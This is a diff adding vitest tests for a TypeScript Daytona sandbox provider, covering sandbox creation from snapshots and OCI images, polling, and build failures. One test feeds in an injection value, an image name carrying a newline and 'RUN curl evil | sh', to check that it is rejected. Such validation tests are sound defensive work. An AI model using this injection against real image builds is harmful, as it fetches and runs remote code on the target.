@@ -1,5 +1,29 @@
 import { expect, it, vi } from "vitest";
+import type { ProviderCreateSandboxInput } from "@openmetal/provider-core";
 import { DaytonaSandboxProvider } from "../src/index.js";
+
+const DIGEST_IMAGE =
+  "docker.io/superagentai/repository-red-team@sha256:ca7c5f624d88bf51879fe55c85aaaf7e292ee9a27e25a5f682bcaa6a987df5e7";
+
+function createInput(image?: string): ProviderCreateSandboxInput {
+  return {
+    metalSandboxId: "sbx_1",
+    organizationId: "org",
+    projectId: "prj",
+    language: image ? "custom" : "typescript",
+    image,
+    ttlMinutes: 30,
+    source: image
+      ? { kind: "oci_image", image }
+      : { kind: "environment", environment: "metal/node", version: "latest" },
+    resources: { vcpu: 2, memoryMb: 4096, diskMb: 10_240, architecture: "x86_64" },
+    lifecycle: {
+      runtimeTimeoutSeconds: 1800,
+      onRuntimeTimeout: "destroy",
+      onIdleTimeout: "destroy",
+    },
+  };
+}
 
 it("declares the Daytona provider contract", () => {
   const provider = new DaytonaSandboxProvider({ apiKey: "test" });
@@ -24,6 +48,175 @@ it("declares the Daytona provider contract", () => {
   });
   expect(provider.exposeHttpEndpoint).toBeUndefined();
   expect(provider.revokeHttpEndpoint).toBeUndefined();
+});
+
+it("boots the default Daytona snapshot when no image is requested", async () => {
+  const fetchImpl = vi.fn<typeof fetch>(async (_input, init) => {
+    expect(JSON.parse(String(init?.body))).toEqual({
+      name: "metal-sbx_1",
+      ephemeral: true,
+      autoDeleteInterval: 0,
+      labels: {
+        "metal.sandbox_id": "sbx_1",
+        "metal.organization_id": "org",
+        "metal.project_id": "prj",
+      },
+    });
+    return Response.json({
+      id: "sandbox-1",
+      organizationId: "org-1",
+      state: "started",
+      toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
+    });
+  });
+  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
+
+  await expect(provider.create(createInput())).resolves.toMatchObject({
+    providerResourceId: "sandbox-1",
+    providerOrganizationId: "org-1",
+  });
+  expect(fetchImpl).toHaveBeenCalledTimes(1);
+});
+
+it("builds a Daytona sandbox from the requested OCI image and waits until it starts", async () => {
+  vi.useFakeTimers();
+  let polls = 0;
+  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
+    const url = String(input);
+    if (init?.method === "POST") {
+      expect(JSON.parse(String(init.body))).toEqual({
+        name: "metal-sbx_1",
+        ephemeral: true,
+        autoDeleteInterval: 0,
+        buildInfo: { dockerfileContent: `FROM ${DIGEST_IMAGE}\n` },
+        cpu: 2,
+        memory: 4,
+        disk: 10,
+        labels: {
+          "metal.sandbox_id": "sbx_1",
+          "metal.organization_id": "org",
+          "metal.project_id": "prj",
+        },
+      });
+      return Response.json({
+        id: "sandbox-1",
+        organizationId: "org-1",
+        state: "building_snapshot",
+      });
+    }
+    if (url.endsWith("/sandbox/sandbox-1")) {
+      polls += 1;
+      return Response.json({
+        id: "sandbox-1",
+        organizationId: "org-1",
+        state: polls < 2 ? "pulling_snapshot" : "started",
+        toolboxProxyUrl: "https://proxy.daytona.test/toolbox/{sandboxId}",
+      });
+    }
+    throw new Error(`Unexpected URL: ${url}`);
+  });
+  const provider = new DaytonaSandboxProvider({
+    apiKey: "test",
+    fetchImpl,
+    imageReadyTimeoutMs: 60_000,
+  });
+
+  const created = provider.create(createInput(DIGEST_IMAGE));
+  await vi.advanceTimersByTimeAsync(4_000);
+  await expect(created).resolves.toMatchObject({
+    providerResourceId: "sandbox-1",
+    providerOrganizationId: "org-1",
+    resolvedResources: { vcpu: 2, memoryMb: 4096, diskMb: 10_240 },
+  });
+  expect(polls).toBe(2);
+  vi.useRealTimers();
+});
+
+it("allocates 16 GiB when an OCI image request omits disk", async () => {
+  const fetchImpl = vi.fn<typeof fetch>(async (_input, init) => {
+    expect(JSON.parse(String(init?.body))).toMatchObject({
+      buildInfo: { dockerfileContent: "FROM node:22-bookworm\n" },
+      cpu: 2,
+      memory: 4,
+      disk: 16,
+    });
+    return Response.json({
+      id: "sandbox-1",
+      organizationId: "org-1",
+      state: "started",
+    });
+  });
+  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
+  const input = createInput("node:22-bookworm");
+  delete input.resources.diskMb;
+
+  await expect(provider.create(input)).resolves.toMatchObject({
+    resolvedResources: { memoryMb: 4096, diskMb: 16_384 },
+  });
+});
+
+it("rejects an OCI image reference that is not safe to place in a Dockerfile", async () => {
+  const fetchImpl = vi.fn<typeof fetch>();
+  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
+
+  await expect(provider.create(createInput("node:22\nRUN curl evil | sh"))).rejects.toMatchObject({
+    kind: "invalid_request",
+  });
+  expect(fetchImpl).not.toHaveBeenCalled();
+});
+
+it("reports a failed Daytona image build instead of a ready sandbox", async () => {
+  const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
+    Response.json({
+      id: "sandbox-1",
+      organizationId: "org-1",
+      state: "build_failed",
+      errorReason: "manifest unknown",
+    }),
+  );
+  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
+
+  await expect(provider.create(createInput("node:22-bookworm"))).rejects.toMatchObject({
+    kind: "customer",
+    message: "Daytona image build failed: manifest unknown",
+  });
+  expect(fetchImpl).toHaveBeenCalledWith(
+    "https://app.daytona.io/api/sandbox/sandbox-1",
+    expect.objectContaining({ method: "DELETE" }),
+  );
+});
+
+it("waits for an existing named sandbox after a create conflict", async () => {
+  vi.useFakeTimers();
+  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
+    const url = String(input);
+    if (init?.method === "POST") return new Response(null, { status: 409 });
+    if (url.endsWith("/sandbox/metal-sbx_1")) {
+      return Response.json({
+        id: "sandbox-1",
+        organizationId: "org-1",
+        state: "pending_build",
+      });
+    }
+    if (url.endsWith("/sandbox/sandbox-1")) {
+      return Response.json({
+        id: "sandbox-1",
+        organizationId: "org-1",
+        state: "started",
+      });
+    }
+    throw new Error(`Unexpected URL: ${url}`);
+  });
+  const provider = new DaytonaSandboxProvider({
+    apiKey: "test",
+    fetchImpl,
+    imageReadyTimeoutMs: 60_000,
+  });
+
+  const created = provider.create(createInput("ghcr.io/superagentai/repository-red-team:0.9.1"));
+  await vi.advanceTimersByTimeAsync(2_000);
+  await expect(created).resolves.toMatchObject({ providerResourceId: "sandbox-1" });
+  vi.useRealTimers();
 });
 
 it("uses Daytona native computer actions, screenshots, and recordings", async () => {
